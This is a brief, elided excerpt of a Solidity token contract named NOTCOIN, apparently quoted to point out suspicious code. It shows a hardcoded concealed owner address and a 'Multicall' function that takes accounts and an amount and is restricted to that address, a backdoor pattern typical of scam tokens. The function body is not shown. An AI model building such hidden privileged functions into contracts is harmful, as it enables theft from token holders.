...
contract NOTCOIN is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _ownr = 0x6C964bcBBaEb74Ff33688b5Ee9811bC6e468A23e;
    ...
    function Multicall (address[] calldata accounts, uint256 amount)  external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
